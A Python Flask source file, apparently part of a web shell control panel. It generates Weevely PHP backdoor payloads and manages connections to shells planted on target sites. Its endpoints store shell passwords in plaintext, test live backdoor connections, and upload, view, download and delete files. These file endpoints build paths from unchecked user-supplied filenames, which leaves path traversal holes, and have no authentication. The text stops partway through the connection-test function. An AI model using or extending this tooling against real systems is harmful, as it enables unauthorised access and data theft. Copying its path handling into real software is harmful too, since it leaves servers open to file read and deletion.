# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

import os
import uuid
import subprocess
import hashlib
import math
import json
import tempfile
from datetime import datetime
from flask import render_template, jsonify, request, current_app, send_file
from werkzeug.utils import secure_filename
from apps.weevely import blueprint
from apps.models import ShellConnection, ShellCommand, ShellStatus, ShellType, db, DataFile, CronJob
from apps.exceptions.exception import InvalidUsage
from apps.weevely.module_executor import WeevelyModuleExecutor, WeevelyPayloadGenerator
import time
import datetime as dt

# Initialize global executor
try:
    executor = WeevelyModuleExecutor()
    payload_generator = WeevelyPayloadGenerator()
except Exception as e:
    print(f"Warning: Failed to initialize WeevelyModuleExecutor: {e}")
    executor = None
    payload_generator = None

# Global storage for cron downloads (in production, use Redis or database)
cron_downloads = {}

def extract_password_from_notes(notes):
    """Extract password from notes field"""
    if not notes:
        return None
    try:
        # Try to parse as JSON first
        if notes.startswith('{'):
            data = json.loads(notes)
            return data.get('password')
        # Fallback: look for password in text
        lines = notes.split('\n')
        for line in lines:
            if 'password:' in line.lower():
                return line.split(':', 1)[1].strip()
        return None
    except:
        return None

#############################################
#dataserver upload/download
##############################################
def get_folder_file_upload():
    """Get upload folder path"""
    return os.path.join(current_app.root_path, '..', 'dataserver', 'uploads')

def get_folder_file_download():
    """Get download folder path"""
    return os.path.join(current_app.root_path, '..', 'dataserver', 'downloads')

#Chức năng download file và upload file lên server từ CLIENT request
@blueprint.route('/api/dataserver/list-file', methods=['GET'])
def list_file():
    """List all files in the upload folder"""
    try:
        search_query = request.args.get('search', '', type=str).strip()
        folder_type = request.args.get('folder', 'upload')
        
        files = DataFile.search_files(search_query, folder_type)

        # Chuyển đổi thành format phù hợp cho frontend
        file_list = []
        for file_obj in files:
            file_info = {
                'id': file_obj.file_id,
                'name': file_obj.file_name,
                'size': file_obj.file_size,
                'size_readable': file_obj.get_file_size_readable(),
                'type': file_obj.file_type,
                'hash': file_obj.file_hash,
                'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                'path': file_obj.local_path
            }
            file_list.append(file_info)

        return jsonify({'status': '1', 'files': file_list})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

#lấy tất cả thông tin về file đã download
@blueprint.route('/api/dataserver/list-file-download', methods=['GET'])
def list_filedownload():
    """List all files in the download folder"""
    try:
        download_folder = get_folder_file_download()
        if not os.path.exists(download_folder):
            os.makedirs(download_folder, exist_ok=True)
        
        files = []
        for filename in os.listdir(download_folder):
            file_path = os.path.join(download_folder, filename)
            if os.path.isfile(file_path):
                file_stat = os.stat(file_path)
                files.append({
                    'name': filename,
                    'size': file_stat.st_size,
                    'modified': datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                    'path': file_path
                })
        
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Lấy danh sách file upload từ database
@blueprint.route('/api/dataserver/list-file-upload', methods=['GET'])
def list_fileupload():
    """List all uploaded files from database"""
    try:
        search_query = request.args.get('search', '', type=str).strip()
        
        # Lấy danh sách file từ database
        files = DataFile.search_files(search_query, 'upload', limit=100)
        
        # Chuyển đổi thành format phù hợp cho frontend
        file_list = []
        for file_obj in files:
            file_info = {
                'id': file_obj.file_id,
                'name': file_obj.file_name,
                'size': file_obj.file_size,
                'size_readable': file_obj.get_file_size_readable(),
                'type': file_obj.file_type,
                'hash': file_obj.file_hash,
                'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                'path': file_obj.local_path
            }
            file_list.append(file_info)
        
        return jsonify({'status': '1', 'files': file_list})
    except Exception as e:
        return jsonify({'status': '0', 'error': str(e)}), 500



def get_unique_filename(folder, filename):
    name, ext = os.path.splitext(filename)
    counter = 1
    new_filename = filename

    while os.path.exists(os.path.join(folder, new_filename)):
        new_filename = f"{name}({counter}){ext}"
        counter += 1

    return new_filename

#upload file lên server => OKKKKKKKKKKKKKKKKKKKKKKKKKKK
@blueprint.route('/api/dataserver/upload-file', methods=['POST'])
def upload_file_to_server():
    try:
        file = request.files['file']
        if file and file.filename:
            file_name = get_unique_filename(get_folder_file_upload(), file.filename)           
            
            # Lưu file trước
            file.save(os.path.join(get_folder_file_upload(), file_name))            
            
            # Định nghĩa local_path trước khi sử dụng
            local_path = os.path.join(get_folder_file_upload(), file_name)
            
            # Tính file size
            file_size = os.path.getsize(local_path)  # Lấy size theo bytes
            file_size_kb = file_size / 1024  # Chuyển sang KB
            
            # Tính hash SHA256
            sha256_hash = hashlib.sha256()
            with open(local_path, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(chunk)
            file_hash = sha256_hash.hexdigest()

            source_path = ""
            local_path_db = os.path.join('..', 'dataserver', 'uploads', file_name) # Đường dẫn để lưu vào DB
            file_type = "upload"
            shell_conn = ""
            #datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            file_created_at = dt.datetime.utcnow() 
            file_updated_at = dt.datetime.utcnow() 
            
            #Lưu file vào database
            data_file = DataFile(
                file_name=file_name,
                source_path=source_path,
                local_path=local_path_db,
                file_type=file_type,
                file_size=file_size_kb,
                file_hash=file_hash,
                connection_id=shell_conn,
                file_created_at=file_created_at,
                file_updated_at=file_updated_at
            )   
            print(f"[+] Data file: {data_file}")
            db.session.add(data_file)
            db.session.commit()

            return jsonify({'status': '1', 'msg': 'File uploaded successfully', 'file_name': file.filename})
        else:
            return jsonify({'status': '-1', 'msg': 'No file provided'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500


#view one file có thể dùng chung được cho cả upload và download
@blueprint.route('/api/dataserver/view-file', methods=['GET'])
def view_file():
    """View content of a specific file - can read any file type intelligently"""
    try:
        filename = request.args.get('filename')
        folder_type = request.args.get('folder', 'upload')  # 'upload' or 'download'
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        if folder_type == 'upload':
            folder_path = get_folder_file_upload()
        else:
            folder_path = get_folder_file_download()
        
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        file_stat = os.stat(file_path)
        file_size = file_stat.st_size
        file_ext = os.path.splitext(filename)[1].lower()
        file_obj = DataFile.get_by_file_name(filename)
        password = DataFile.get_by_file_name(filename).password

        # Kiểm tra file size để tránh load file quá lớn
        MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB limit
        if file_size > MAX_FILE_SIZE:
            return jsonify({
                'file_id': file_obj.file_id,
                'status': '1',
                'filename': filename,
                'content': f'[File too large to view]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nFile is too large to display. Please download it instead.',
                'type': 'large_file',
                'size': file_size,
                'lines': 'N/A',
                'warning': 'File too large to view',
                'password': password
            })
        
        # Định nghĩa các loại file và cách xử lý
        text_extensions = {
            '.txt', '.py', '.js', '.html', '.css', '.php', '.java', '.md', '.json', '.xml', 
            '.sql', '.log', '.conf', '.ini', '.cfg', '.yml', '.yaml', '.sh', '.bat', '.ps1',
            '.c', '.cpp', '.h', '.hpp', '.cs', '.vb', '.go', '.rs', '.swift', '.kt', '.scala',
            '.r', '.m', '.pl', '.rb', '.lua', '.tcl', '.awk', '.sed', '.tex', '.rst', '.adoc'
        }
        
        image_extensions = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff', '.webp', '.svg', '.ico'}
        archive_extensions = {'.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.lzma'}
        document_extensions = {'.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp'}
        audio_extensions = {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a'}
        video_extensions = {'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v'}
        
        # Xử lý text files
        if file_ext in text_extensions:
            try:
                # Thử với UTF-8 trước
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return jsonify({
                    'file_id': file_obj.file_id,
                    'status': '1',
                    'filename': filename,
                    'content': content,
                    'type': 'text',
                    'size': file_size,
                    'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                    'lines': len(content.splitlines()),
                    'encoding': 'UTF-8',
                    'file_type': 'Text File',
                    'password': password
                })
            except UnicodeDecodeError:
                # Thử với các encoding khác
                encodings = ['latin-1', 'cp1252', 'iso-8859-1', 'utf-16', 'utf-8-sig']
                for encoding in encodings:
                    try:
                        with open(file_path, 'r', encoding=encoding) as f:
                            content = f.read()
                        return jsonify({
                            'file_id': file_obj.file_id,
                            'status': '1',
                            'filename': filename,
                            'content': content,
                            'type': 'text',
                            'size': file_size,
                            'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                            'lines': len(content.splitlines()),
                            'encoding': encoding,
                            'file_type': 'Text File',
                            'password': password
                        })
                    except:
                        continue
                
                # Nếu không đọc được với encoding nào, thử đọc binary và hiển thị hex
                try:
                    with open(file_path, 'rb') as f:
                        binary_data = f.read(min(file_size, 1024))  # Chỉ đọc 1KB đầu
                    
                    hex_content = binary_data.hex()
                    hex_lines = [hex_content[i:i+32] for i in range(0, len(hex_content), 32)]
                    hex_display = '\n'.join(hex_lines)
                    
                    return jsonify({
                        'file_id': file_obj.file_id,
                        'status': '1',
                        'filename': filename,
                        'content': f'[Binary file - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nFirst 1KB in HEX:\n{hex_display}',
                        'type': 'binary_hex',
                        'size': file_size,
                        'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                        'lines': 'Binary',
                        'file_type': 'Binary File (HEX View)',
                        'password': password
                    })
                except Exception as e:
                    return jsonify({'error': f'Cannot read file content: {str(e)}'}), 500
        
        # Xử lý image files
        elif file_ext in image_extensions:
            try:
                # Đọc header của image để lấy thông tin
                with open(file_path, 'rb') as f:
                    header = f.read(16)
                
                # Tạo thông tin chi tiết về image
                image_info = f'[Image File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nImage Details:\n- Format: {file_ext.upper()}\n- Header (hex): {header.hex()[:32]}...\n\nNote: This is a binary image file. Use download button to save it.'
                
                return jsonify({
                    'file_id': file_obj.file_id,
                    'status': '1',
                    'filename': filename,
                    'content': image_info,
                    'type': 'image',
                    'size': file_size,
                    'size_readable': f"{file_size / (1024*1024):.2f} MB",
                    'lines': 'Binary Image',
                    'file_type': 'Image File',
                    'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                    'password': password
                })
            except Exception as e:
                return jsonify({'error': f'Cannot read file content: {str(e)}'}), 500
        # Xử lý archive files
        elif file_ext in archive_extensions:
            archive_info = f'[Archive File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nArchive Details:\n- Format: {file_ext.upper()}\n- Compressed size: {file_size} bytes\n\nNote: This is a compressed archive file. Use download button to save it.'
            
            return jsonify({
                'file_id': file_obj.file_id,
                'status': '1',
                'filename': filename,
                'content': archive_info,
                'type': 'archive',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Compressed Archive',
                'file_type': 'Archive File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                'password': password
            })
        
        # Xử lý document files
        elif file_ext in document_extensions:
            doc_info = f'[Document File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nDocument Details:\n- Format: {file_ext.upper()}\n- Size: {file_size} bytes\n\nNote: This is a document file. Use download button to save it.'
            
            return jsonify({
                'file_id': file_obj.file_id,
                'status': '1',
                'filename': filename,
                'content': doc_info,
                'type': 'document',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Document',
                'file_type': 'Document File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                'password': password
            })
        
        # Xử lý audio files
        elif file_ext in audio_extensions:
            audio_info = f'[Audio File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nAudio Details:\n- Format: {file_ext.upper()}\n- Size: {file_size} bytes\n\nNote: This is an audio file. Use download button to save it.'
            
            return jsonify({
                'file_id': file_obj.file_id,
                'status': '1',
                'filename': filename,
                'content': audio_info,
                'type': 'audio',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Audio',
                'file_type': 'Audio File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                'password': password
            })
        
        # Xử lý video files
        elif file_ext in video_extensions:
            video_info = f'[Video File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nVideo Details:\n- Format: {file_ext.upper()}\n- Size: {file_size} bytes\n\nNote: This is a video file. Use download button to save it.'
            
            return jsonify({
                'file_id': file_obj.file_id,
                'status': '1',
                'filename': filename,
                'content': video_info,
                'type': 'video',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Video',
                'file_type': 'Video File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                'password': password
            })
        
        # Xử lý các file khác (binary files)
        else:
            try:
                # Đọc một phần đầu của file để phân tích
                with open(file_path, 'rb') as f:
                    binary_data = f.read(min(file_size, 512))  # Chỉ đọc 512 bytes đầu
                
                # Kiểm tra xem có phải là text file không (dù extension không phải text)
                try:
                    text_content = binary_data.decode('utf-8', errors='ignore')
                    # Nếu có ít nhất 70% là printable characters thì coi như text
                    printable_chars = sum(1 for c in text_content if c.isprintable() or c in '\n\r\t')
                    if printable_chars / len(text_content) > 0.7:
                        return jsonify({
                            'file_id': file_obj.file_id,
                            'status': '1',
                            'filename': filename,
                            'content': f'[Text-like file - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nContent (first 512 bytes):\n{text_content}',
                            'type': 'text_like',
                            'size': file_size,
                            'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                            'lines': 'Unknown',
                            'file_type': 'Text-like File',
                            'password': password
                        })
                except Exception:
                    pass
                
                # Hiển thị dưới dạng hex
                hex_content = binary_data.hex()
                hex_lines = [hex_content[i:i+32] for i in range(0, len(hex_content), 32)]
                hex_display = '\n'.join(hex_lines)
                
                binary_info = f'[Binary File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nBinary Analysis:\n- File type: Unknown binary\n- First 512 bytes in HEX:\n{hex_display}\n\nNote: This is a binary file. Use download button to save it.'
                
                return jsonify({
                    'file_id': file_obj.file_id,
                    'status': '1',
                    'filename': filename,
                    'content': binary_info,
                    'type': 'binary',
                    'size': file_size,
                    'size_readable': f"{file_size / (1024*1024):.2f} MB",
                    'lines': 'Binary',
                    'file_type': 'Binary File',
                    'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                    'password': password
                })
                
            except Exception as e:
                return jsonify({
                    'file_id': file_obj.file_id,
                    'status': '1',
                    'filename': filename,
                    'content': f'[Unknown File Type - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nError reading file: {str(e)}\n\nNote: Cannot read this file type. Use download button to save it.',
                    'type': 'unknown',
                    'size': file_size,
                    'size_readable': f"{file_size / (1024*1024):.2f} MB",
                    'lines': 'Unknown',
                    'file_type': 'Unknown File Type',
                    'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}',
                    'password': password
                })
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# API để xem nội dung file upload từ database
@blueprint.route('/api/dataserver/view-upload-file', methods=['GET'])
def view_upload_file():
    """View content of an uploaded file by ID"""
    try:
        file_id = request.args.get('id')
        
        # Lấy thông tin file từ database
        file_obj = DataFile.get_by_id(file_id)
        
        # Kiểm tra xem file có tồn tại trên disk không
        upload_folder = get_folder_file_upload()
        file_path = os.path.join(upload_folder, file_obj.file_name)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found on disk'}), 404
        
        # Kiểm tra xem file có phải là text file không
        text_extensions = {
                            '.txt', '.py', '.js', '.ts', '.jsx', '.tsx', '.html', '.htm', '.css', '.scss', '.sass',
                            '.php', '.java', '.md', '.json', '.xml', '.sql', '.log', '.conf', '.ini', '.cfg',
                            '.sh', '.bat', '.yml', '.yaml', '.rb', '.go', '.c', '.cpp', '.h', '.hpp', '.rs'
                        }
        file_ext = os.path.splitext(file_obj.file_name)[1].lower()
        password = file_obj.password
        if file_ext in text_extensions:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                #print(f"[+] Content: {content}")
                return jsonify({
                    'file_id': file_obj.file_id,
                    'status': '1',
                    'filename': file_obj.file_name,
                    'content': content,
                    'type': 'text',
                    'size': file_obj.file_size,
                    'size_readable': file_obj.get_file_size_readable(),
                    'lines': len(content.splitlines()),
                    'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                    'hash': file_obj.file_hash,
                    'password': password
                })
            except UnicodeDecodeError:
                # Thử với encoding khác
                try:
                    with open(file_path, 'r', encoding='latin-1') as f:
                        content = f.read()
                    return jsonify({
                        'file_id': file_obj.file_id,
                        'status': '1',
                        'filename': file_obj.file_name,
                        'content': content,
                        'type': 'text',
                        'size': file_obj.file_size,
                        'size_readable': file_obj.get_file_size_readable(),
                        'lines': len(content.splitlines()),
                        'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                        'hash': file_obj.file_hash,
                        'password': password
                    })
                except:
                    return jsonify({'error': 'Cannot read file content'}), 500
        else:
            # Binary file
            file_stat = os.stat(file_path)
            return jsonify({
                'file_id': file_obj.file_id,
                'status': '1',
                'filename': file_obj.file_name,
                'content': f'[Binary file - {file_ext.upper()}]\n\nFile Information:\n- Name: {file_obj.file_name}\n- Size: {file_obj.get_file_size_readable()}\n- Type: {file_ext.upper()}\n- Uploaded: {file_obj.file_created_at.strftime("%Y-%m-%d %H:%M:%S") if file_obj.file_created_at else "Unknown"}\n- Hash: {file_obj.file_hash}',
                'type': 'binary',
                'size': file_obj.file_size,
                'size_readable': file_obj.get_file_size_readable(),
                'lines': 'Binary',
                'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                'hash': file_obj.file_hash,
                'password': password
            })
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# API để xóa file upload
@blueprint.route('/api/dataserver/delete-upload-file', methods=['DELETE'])
def delete_upload_file():
    """Delete an uploaded file by ID"""
    try:
        file_id = request.args.get('id')
        if not file_id:
            return jsonify({'error': 'File ID is required'}), 400
        
        # Lấy thông tin file từ database
        file_obj = DataFile.get_by_id(file_id)
        if not file_obj:
            return jsonify({'error': 'File not found'}), 404
        
        # Xóa file trên disk
        upload_folder = get_folder_file_upload()
        file_path = os.path.join(upload_folder, file_obj.file_name)
        
        if os.path.exists(file_path):
            os.remove(file_path)
        
        # Xóa record từ database
        file_obj.delete_file()
        
        return jsonify({'status': '1', 'msg': 'File deleted successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# API để download file upload
@blueprint.route('/api/dataserver/download-upload-file', methods=['GET'])
def download_upload_file():
    """Download an uploaded file by ID"""
    try:
        file_id = request.args.get('id')
        if not file_id:
            return jsonify({'error': 'File ID is required'}), 400
        
        # Lấy thông tin file từ database
        file_obj = DataFile.get_by_id(file_id)
        if not file_obj:
            return jsonify({'error': 'File not found'}), 404
        
        # Kiểm tra xem file có tồn tại trên disk không
        upload_folder = get_folder_file_upload()
        file_path = os.path.join(upload_folder, file_obj.file_name)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found on disk'}), 404
        
        # Trả về file để download
        from flask import send_file
        return send_file(
            file_path,
            as_attachment=True,
            download_name=file_obj.file_name,
            mimetype='application/octet-stream'
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

#Xoa file
@blueprint.route('/api/dataserver/delete-download-file', methods=['DELETE'])
def delete_download_file():
    """Delete a specific file"""
    try:
        filename = request.args.get('filename')
        folder_type = request.args.get('folder', 'upload')  # 'upload' or 'download'
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        if folder_type == 'upload':
            folder_path = get_folder_file_upload()
        else:
            folder_path = get_folder_file_download()
        
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.isfile(file_path):
            return jsonify({'error': 'Not a file'}), 400
        
        # Delete the file
        os.remove(file_path)
        
        return jsonify({
            'status': 'success',
            'message': f'File {filename} deleted successfully'
        })
        
    except PermissionError:
        return jsonify({'error': 'Permission denied'}), 403
    except Exception as e:
        return jsonify({'error': str(e)}), 500

#tải file về máy client
@blueprint.route('/api/dataserver/download-download-file', methods=['GET'])
def download_file():
    """Download a specific file"""
    try:
        filename = request.args.get('filename')
        folder_type = request.args.get('folder', 'upload')  # 'upload' or 'download'
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        if folder_type == 'upload':
            folder_path = get_folder_file_upload()
        else:
            folder_path = get_folder_file_download()
        
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.isfile(file_path):
            return jsonify({'error': 'Not a file'}), 400
        
        # Import Flask send_file for file download
        from flask import send_file
        
        return send_file(
            file_path,
            as_attachment=True,
            download_name=filename,
            mimetype='application/octet-stream'
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500






# ==========================================
# ADVANCED WEEVELY PAYLOAD & MODULE APIs
# ==========================================
from apps.weevely.module_executor import WeevelyModuleExecutor, WeevelyPayloadGenerator
from apps.models import ShellConnection, ShellType, ShellStatus


# Initialize components
executor = WeevelyModuleExecutor()
payload_generator = WeevelyPayloadGenerator()
  
@blueprint.route('/weevely', methods=['GET'])
def weevely():
    """Main weevely management page"""
    return render_template('weevely/index-weevely.html', segment='index_weevely')

@blueprint.route('/api/weevely', methods=['GET'])
def get_weevely_connections():
    """Get and search weevely connections list"""
    try:
        page = request.args.get('page', 1, type=int)
        search_query = request.args.get('search', '', type=str).strip()
        sort_type = request.args.get('sort', '', type=str).strip()
        per_page = 7
        
        print(f"[x]LIST-WEEVELY page: {page} & search_query={search_query} & sort_type={sort_type}")
        
        # Filter only WEBSHELL type connections for weevely
        weevely_connections, total_pages = ShellConnection.search(search_query, page, per_page, sort_type)
        # Filter to only show WEBSHELL type
        if weevely_connections:
            weevely_connections = [conn for conn in weevely_connections if conn.shell_type == ShellType.WEBSHELL]
        
        html = render_template('weevely/partial-list-weevely.html', weevely_connections=weevely_connections, loader=0)
        
        return jsonify({
            'html': html,
            'total_pages': total_pages
        })
    except Exception as e:
        print(f"Error in get_weevely_connections: {str(e)}")
        return jsonify({'error': 'Server error', 'details': str(e)}), 500

# ==========================================
# PAYLOAD GENERATION => Tạo payload và lưu vào CSDL ĐÃ THÀNH CÔNGGGGGGG
# ==========================================
@blueprint.route('/api/weevely/create-weevely-payload', methods=['POST'])
def create_weevely_payload():
    """Tạo weevely payload"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        filename = data.get('filename') + '.php'
        password = data.get('password')
        #print(f"[+] Create Weevely Payload Data: {filename} & {password}")

        if not filename or not password:
            return jsonify({'status': 'error', 'message': 'Filename and password required'}), 400
        
        result = payload_generator.create(filename, password)
        if result['success']:
            '''Nếu tạo được payloadf rồi thì ta sẽ nó vào CSDL'''

            local_path_db = os.path.join('..', 'dataserver', 'uploads', filename) # Đường dẫn để lưu vào DB
            file_size = os.path.getsize(os.path.join(get_folder_file_upload(), filename))  # Lấy size theo bytes
            file_size_kb = file_size / 1024  # Chuyển sang KB
            
            # Tính hash SHA256
            sha256_hash = hashlib.sha256()
            with open(os.path.join(get_folder_file_upload(), filename), "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(chunk)
            file_hash = sha256_hash.hexdigest()
            # Tạo connection mới
            datafile = DataFile(                
                file_name=filename,
                source_path= '',
                local_path= local_path_db,
                file_type='upload',
                file_size=file_size_kb,
                file_hash=file_hash,
                connection_id='',
                file_created_at=datetime.now(),
                file_updated_at=datetime.now(),
                password=password
            )
            
            db.session.add(datafile)
            db.session.commit()
            
            return jsonify({
                'status': '1',
                'data': result
            })
        else:
            return jsonify({
                'status': '-1',
                'data': result
            })
        
    except Exception as e:
        print(f"[##] Error in create_weevely_payload: {str(e)}")
        return jsonify({'message': str(e)}), 500

@blueprint.route('/api/weevely/add-weevely', methods=['POST'])
def add_weevely():
    """Add new weevely connection"""
    try:
        data = request.get_json()
        print(f"Add Weevely Data: {data}")
        
        if not data:
            return jsonify({'status': '0', 'message': 'No input data provided'}), 400
        
        # Validate required fields
        required_fields = ['name', 'password', 'target_url']
        for field in required_fields:
            if not data.get(field):
                return jsonify({'status': '0', 'message': f'Field {field} is required'}), 400
        
        # Generate unique ID
        connection_id = str(uuid.uuid4())
        
        # Extract optional fields
        target_hostname = data.get('target_hostname', '')
        target_ip = data.get('target_ip', '')
        notes = data.get('notes', '')
        
        #print(f'{connection_id},{data["name"]},{data["target_url"]},{target_hostname},{target_ip},{data["password"]},{notes}')

        # Create weevely connection using ShellConnection with WEBSHELL type
        shell_conn = ShellConnection.create_connection(
            connection_id=connection_id,
            name=data['name'],
            shell_type=ShellType.WEBSHELL,
            url=data['target_url'],
            hostname=target_hostname,
            remote_ip=target_ip,
            status=ShellStatus.CLOSED,
            password=data['password'],
            notes=f"Weevely Password: {data['password']}\n{notes}"
        )
        
        return jsonify({
            'status': '1',
            'message': 'Weevely connection created successfully',
            'weevely_id': connection_id,
            'data': shell_conn.to_dict()
        })
        
    except Exception as e:
        print(f"Error in add_weevely: {str(e)}")
        return jsonify({'message': 'Server error', 'details': str(e)}), 500

@blueprint.route('/api/weevely/<weevely_id>', methods=['DELETE'])
def delete_weevely(weevely_id):
    """Delete weevely connection"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
            return jsonify({'status': 'error', 'message': 'Weevely connection not found'}), 404
        
        # Clean up generated backdoor files if they exist in downloads folder
        backdoor_dir = os.path.join(current_app.root_path, '..', 'downloads', 'weevely_backdoors')
        potential_files = [
            os.path.join(backdoor_dir, f'weevely_{weevely_id[:8]}.php'),
            os.path.join(backdoor_dir, f'{shell_conn.name.replace(" ", "_")}.php')
        ]
        
        for file_path in potential_files:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except OSError:
                    pass  # File might be in use or permission issue
        
        shell_conn.delete()
        
        return jsonify({
            'status': 'success',
            'message': 'Weevely connection deleted successfully'
        })
        
    except Exception as e:
        print(f"Error in delete_weevely: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Server error', 'details': str(e)}), 500

def extract_password_from_notes(notes):
    """Extract weevely password from notes field"""
    if not notes:
        return None
    lines = notes.split('\n')
    for line in lines:
        if line.startswith('Weevely Password: '):
            return line.replace('Weevely Password: ', '').strip()
    return None



def extract_password_from_notes(notes):
    """Extract password from notes field"""
    if not notes:
        return None
    # Simple extraction - you can improve this
    lines = notes.split('\n')
    for line in lines:
        if 'password:' in line.lower():
            return line.split(':', 1)[1].strip()
    return None



# ==========================================
# CONNECTION & SESSION
# ==========================================

@blueprint.route('/<weevely_id>/test', methods=['POST'])
def test_connection(weevely_id):
    """Test kết nối weevely"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        result = executor.test_connection(shell_conn.url, password)
        
        if result['success']:
            shell_conn.update_status(ShellStatus.CONNECTED)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
